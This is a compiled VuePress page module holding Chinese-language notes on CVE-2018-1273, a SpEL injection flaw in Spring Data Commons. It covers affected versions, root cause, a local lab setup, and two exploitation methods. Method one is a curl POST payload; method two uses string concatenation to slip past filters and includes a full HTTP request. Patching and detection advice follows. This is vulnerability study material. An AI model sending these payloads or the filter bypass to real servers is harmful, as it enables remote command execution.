import{_ as t}from"./plugin-vue_export-helper-x3n3nnut.js";import{r,o as s,c as d,a,b as e,d as n,e as l}from"./app-TkD2wYqz.js";const o="/DailyNotes/assets/img1-EnFh0-2j.png",c="/DailyNotes/assets/img4-53O0OgQQ.png",h="/DailyNotes/assets/img3-VOPJ-d8l.png",g="/DailyNotes/assets/img2-MQkelW20.png",p="/DailyNotes/assets/img7-O-io-uuK.png",u="/DailyNotes/assets/img14-aMTI4ZRe.png",m="/DailyNotes/assets/img15-LAiU2Atc.png",v={},x=a("h1",{id:"命令执行-spring-cve-2018-1273-spring-data-commons远程命令执行漏洞-利用方式二可绕过",tabindex:"-1"},[a("a",{class:"header-anchor",href:"#命令执行-spring-cve-2018-1273-spring-data-commons远程命令执行漏洞-利用方式二可绕过","aria-hidden":"true"},"#"),e(" 命令执行_spring_CVE-2018-1273_Spring_Data_Commons远程命令执行漏洞（利用方式二可绕过）")],-1),f=a("hr",null,null,-1),b=a("h2",{id:"漏洞介绍",tabindex:"-1"},[a("a",{class:"header-anchor",href:"#漏洞介绍","aria-hidden":"true"},"#"),e(" 漏洞介绍")],-1),_={href:"https://www.cnnvd.org.cn/home/globalSearch?keyword=CNNVD-201804-564",target:"_blank",rel:"noopener noreferrer"},S={href:"https://nvd.nist.gov/vuln/detail/CVE-2018-1273",target:"_blank",rel:"noopener noreferrer"},D=l('<hr><p><strong>Spring Data</strong>是一个用于简化数据库访问，并支持云服务的开源框架，其主要目标是使数据库的访问变得方便快捷。<strong>Spring Data Commons</strong>是Spring Data下所有子项目共享的基础框架。</p><p>Spring Data是一个用于简化数据库访问，并支持云服务的开源框架，Spring Data Commons是Spring Data下所有子项目共享的基础框架。Spring Data Commons 在2.0.5及以前版本中，组件中存在远程代码执行漏洞，攻击者可构造包含有恶意代码的SPEL表达式实现远程代码攻击，直接获取服务器控制权限。</p><hr><h3 id="漏洞危害" tabindex="-1"><a class="header-anchor" href="#漏洞危害" aria-hidden="true">#</a> 漏洞危害</h3><p>未经身份验证的远程恶意用户（或攻击者）可以针对Spring Data REST支持的HTTP资源提供特制的请求参数，或者使用Spring Data的基于投影的请求有效负载绑定可能导致远程执行代码攻击。</p><hr><h3 id="影响范围" tabindex="-1"><a class="header-anchor" href="#影响范围" aria-hidden="true">#</a> 影响范围</h3><ul><li>Spring Data Commons 1.13 to 1.13.10 (Ingalls SR10)</li><li>Spring Data REST 2.6 to 2.6.10 (Ingalls SR10)</li><li>Spring Data Commons 2.0 to 2.0.5 (Kay SR5)</li><li>Spring Data REST 3.0 to 3.0.5 (Kay SR5)</li><li>Older unsupported versions are also affected</li></ul><hr><h2 id="漏洞原理" tabindex="-1"><a class="header-anchor" href="#漏洞原理" aria-hidden="true">#</a> 漏洞原理</h2><p>Spring Data Commons（1.13至1.13.10之前的版本，2.0至2.0.5的版本以及较旧的不受支持的版本）包含由于特殊元素的不正确中和而导致的属性绑定器漏洞。未经身份验证的远程恶意用户（或攻击者）可以针对Spring Data REST支持的HTTP资源提供特制的请求参数，或者使用Spring Data的基于投影的请求有效负载绑定可能导致远程执行代码攻击。</p><hr><h3 id="源码分析" tabindex="-1"><a class="header-anchor" href="#源码分析" aria-hidden="true">#</a> 源码分析</h3><p>Spring 在自动解析用户的参数的时候采用了SpelExpressionParser 来解析 propertyName，但是并没有对参数进行进行有效的校验，</p><figure><img src="'+o+'" alt="img1" tabindex="0" loading="lazy"><figcaption>img1</figcaption></figure><hr><h2 id="漏洞利用" tabindex="-1"><a class="header-anchor" href="#漏洞利用" aria-hidden="true">#</a> 漏洞利用</h2><hr><h3 id="靶机环境" tabindex="-1"><a class="header-anchor" href="#靶机环境" aria-hidden="true">#</a> 靶机环境</h3><p>自建环境，见文件夹内的.jar文件</p><hr><h3 id="利用方式-1" tabindex="-1"><a class="header-anchor" href="#利用方式-1" aria-hidden="true">#</a> 利用方式 1</h3><hr><h4 id="利用思路" tabindex="-1"><a class="header-anchor" href="#利用思路" aria-hidden="true">#</a> 利用思路</h4><p>利用 this.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec()函数构造 payload 进行代码执行漏洞利用</p><hr><h4 id="漏洞利用-1" tabindex="-1"><a class="header-anchor" href="#漏洞利用-1" aria-hidden="true">#</a> 漏洞利用</h4><p>1）访问http://ip:8080/account</p><figure><img src="'+c+'" alt="img4" tabindex="0" loading="lazy"><figcaption>img4</figcaption></figure><ol start="2"><li>发送payload：这里尝试了两种方法，建议采用第二种。</li></ol><ul><li>方法一：firefox浏览器F12打开，选择network，点击reload后得到请求包，再点击resend即可在浏览器上直接修改请求。如下</li></ul><figure><img src="'+h+`" alt="img3" tabindex="0" loading="lazy"><figcaption>img3</figcaption></figure><p>构造攻击数据，修改为POST请求，payload部分填写如下：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>[#this.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;touch aa.txt&quot;)]
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><ul><li>方法二：执行命令</li></ul><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>curl -X POST http://192.168.1.189:8080/account -d &quot;name[#this.getClass().forName(&#39;java.lang.Runtime&#39;).getRuntime().exec(&#39;touch aa.txt&#39;)]=123&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="`+g+'" alt="img2" tabindex="0" loading="lazy"><figcaption>img2</figcaption></figure><p>3）攻击成功，结果如下：</p><figure><img src="'+p+`" alt="img7" tabindex="0" loading="lazy"><figcaption>img7</figcaption></figure><h3 id="利用方式-2-绕过" tabindex="-1"><a class="header-anchor" href="#利用方式-2-绕过" aria-hidden="true">#</a> 利用方式 2(绕过)</h3><hr><h4 id="利用思路-1" tabindex="-1"><a class="header-anchor" href="#利用思路-1" aria-hidden="true">#</a> 利用思路</h4><p>修改payload为如下形式：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>name[#this.getClass().forName(&#39;ja&#39;+&#39;va.l&#39;+&#39;ang.Run&#39;+&#39;time&#39;).getRuntime().exec(&#39;touch test22.txt&#39;)]=123
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>将原本的payload利用+拼接。</p><hr><h4 id="漏洞利用-2" tabindex="-1"><a class="header-anchor" href="#漏洞利用-2" aria-hidden="true">#</a> 漏洞利用</h4><p>使用hackbar插件，发送如下，</p><figure><img src="`+u+`" alt="img14" tabindex="0" loading="lazy"><figcaption>img14</figcaption></figure><p>这里选择hackbar的原因是编码方式的问题，若使用burpsuite，请求包如下：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /account HTTP/1.1
Host: 192.168.1.189:8080
Connection: keep-alive
Content-Length: 150
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.1.189:8080
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.1.189:8080/account
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9

name%5B%23this.getClass%28%29.forName%28%27ja%27%2B%27va.l%27%2B%27ang.Run%27%2B%27time%27%29.getRuntime%28%29.exec%28%27touch+test22.txt%27%29%5D=123
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>攻击成功，结果如下：</p><figure><img src="`+m+`" alt="img15" tabindex="0" loading="lazy"><figcaption>img15</figcaption></figure><hr><h2 id="威胁防护建议" tabindex="-1"><a class="header-anchor" href="#威胁防护建议" aria-hidden="true">#</a> 威胁防护建议</h2><hr><h3 id="用户处置建议" tabindex="-1"><a class="header-anchor" href="#用户处置建议" aria-hidden="true">#</a> 用户处置建议</h3><p>升级框架到最新版本。将Spring Data Commons框架的版本由2.0.x升级到2.0.6，1.13.x的用户升级到1.13.11。</p><hr><h3 id="产品检测建议" tabindex="-1"><a class="header-anchor" href="#产品检测建议" aria-hidden="true">#</a> 产品检测建议</h3><p>可针对[#this.getClass().forName(&#39;java.lang.Runtime&#39;).getRuntime().exec()的命令及其拼接的形式进行检测。</p><hr><h1 id="附录" tabindex="-1"><a class="header-anchor" href="#附录" aria-hidden="true">#</a> 附录</h1><h2 id="靶场搭建方法" tabindex="-1"><a class="header-anchor" href="#靶场搭建方法" aria-hidden="true">#</a> 靶场搭建方法</h2><p>代码下载：https://github.com/wearearima/poc-cve-2018-1273</p><p>编译后打成jar包（见poc文件夹）</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>cd ./poc
java -jar poc-cve-2018-1273-0.0.1-SNAPSHOT.jar
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div>`,68);function C(y,N){const i=r("ExternalLinkIcon");return s(),d("div",null,[x,f,b,a("blockquote",null,[a("p",null,[a("a",_,[e("国家信息安全漏洞库 (cnnvd.org.cn)"),n(i)])]),a("p",null,[a("a",S,[e("NVD (nist.gov)"),n(i)])])]),D])}const k=t(v,[["render",C],["__file","spring_CVE-2018-1273_bypass.html.vue"]]);export{k as default};
